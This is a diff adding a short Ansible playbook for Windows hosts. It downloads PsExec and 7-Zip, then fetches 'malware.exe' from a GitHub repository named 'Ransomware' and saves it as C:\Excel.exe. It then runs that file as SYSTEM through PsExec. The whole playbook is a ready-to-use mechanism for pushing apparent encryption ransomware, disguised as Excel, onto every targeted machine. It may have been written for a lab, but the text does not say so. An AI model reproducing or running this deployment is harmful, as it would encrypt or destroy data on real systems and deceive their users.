@@ -1,0 +1,33 @@
+- hosts: windows
+  tasks:
+     - name: Download PsExec.zip to specified path
+       win_get_url:
+         url: https://download.sysinternals.com/files/PSTools.zip
+         dest: C:\PSTools.zip
+
+     - name: Download 7zp installer to specified path
+       win_get_url:
+         url: https://www.7-zip.org/a/7z2201-x64.exe
+         dest: C:\7z2201-x64.exe
+
+     - name: Download my_encrypt.exe from github
+       win_get_url:
+         url: https://github.com/GilesFa/Ransomware/raw/master/output/malware.exe
+         dest: C:\Excel.exe
+
+     - name: Install 7zip
+       ansible.windows.win_package:
+         path: C:\7z2201-x64.exe
+         product_id: 7-Zip
+         arguments: /S
+         state: present
+
+     - name: extract archive C:\PSTools.zip
+       community.windows.win_unzip:
+         src: 'C:\PSTools.zip'
+         dest: 'C:\output'
+
+     - name: Run my_encrypt.ex
+       win_command: "c:\\output\\psexec.exe -accepteula -nobanner -i 1 -s c:\\Excel.exe"    
+       register: output
+     - debug: var=output
